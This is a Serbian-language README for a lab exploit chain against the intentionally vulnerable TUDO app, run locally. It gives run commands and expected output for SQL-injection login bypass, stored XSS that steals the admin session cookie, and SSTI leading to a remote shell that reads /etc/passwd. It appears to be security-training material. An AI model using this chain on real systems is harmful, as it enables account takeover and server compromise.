# Pokretanje exploita

## Preduslovi

- Python 3
- Instaliran `requests` paket:

```powershell
pip install requests
```

- Docker Desktop pokrenut
- TUDO aplikacija pokrenuta iz direktorijuma koji sadrzi `docker-compose.yml`:

```powershell
docker compose up --build
```

Aplikacija treba da bude dostupna na:

```text
http://localhost:8000
```

Provera:

```powershell
docker ps
```

U listi kontejnera treba da postoje `tudo-app`, `tudo-db` i `tudo-admin`.

---

## Kompletan exploit chain

Glavni skript je `exploit_chain.py`. On spaja sva tri koraka:

```text
login bypass -> admin privilege escalation -> RCE
```

Pokretanje:

```powershell
python exploit_chain.py http://localhost:8000
```

Skript prvo dobija korisnicku sesiju, zatim ubacuje stored XSS payload u profil korisnika, ceka da admin cron/browser poseti aplikaciju i ukrade admin `PHPSESSID`. Nakon toga koristi admin sesiju za SSTI payload i otvara interaktivni shell.

Admin cron se obicno izvrsava na oko 1 minut, pa je normalno da skript neko vreme stoji na:

```text
[*] Waiting for admin to visit homepage...
```

Za izvrsavanje samo pocetne komande bez ulazenja u interaktivni shell:

```powershell
python exploit_chain.py http://localhost:8000 --no-interactive
```

Pokretanje druge komande kao pocetne:

```powershell
python exploit_chain.py http://localhost:8000 --cmd whoami
```

Sa postojecim admin cookie-jem, moze se preskociti login/XSS deo i direktno pokrenuti RCE:

```powershell
python exploit_chain.py http://localhost:8000 --cookie "PHPSESSID=<admin-session>"
```

---

## Pojedinacni koraci

Stari skriptovi su ostavljeni za demonstriranje svakog dela posebno.

### Korak 0 - Login Bypass

```powershell
python login_bypass.py http://localhost:8000
```

Skripta automatski isprobava poznate lab kredencijale i SQL injection payload-e nad `/login.php`, zatim ispisuje dobijeni `PHPSESSID`.

Ocekivani izlaz:

```text
[+] Login bypass succeeded
[+] Username: 'admin'
[+] Password: 'admin'
[=] Cookie: PHPSESSID=<vrednost>
[=] PHPSESSID: <vrednost>
```

### Korak 1 - Privilege Escalation

```powershell
python privilege_excalation.py http://localhost:8000 user1 user1
```

Skript se prijavljuje kao `user1`, postavlja XSS payload u opis profila i ceka da admin browser poseti pocetnu stranicu.

Ocekivani izlaz:

```text
[*] Logged in as user1
[*] Set user1's description to XSS payload
[*] Listening on localhost:8001...
[*] Waiting for admin to visit homepage...
[+] Got admin cookie: PHPSESSID=<vrednost>
[=] Session ID: <vrednost>
```

Ukoliko se ceka duze od 1 minute pokrenuti u odvojenom terminalu:
```powershell
docker exec -it tudo-admin python3 /app/emulate.py
```

### Korak 2 - Remote Code Execution

```powershell
python rce_ssti.py http://localhost:8000 "PHPSESSID=<vrednost iz koraka 1>"
```

Ocekivani izlaz:

```text
[*] Ubacujem SSTI payload u MotD...
[+] Payload ubacen!
[*] Izvrsavam: id
[+] RCE uspesan!
==================================================
uid=33(www-data) gid=33(www-data) groups=33(www-data)
==================================================
[*] Interaktivni mod (CTRL+C za izlaz):
$ whoami
www-data
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
```

Nakon toga se otvara interaktivni shell za dalje izvrsavanje komandi.

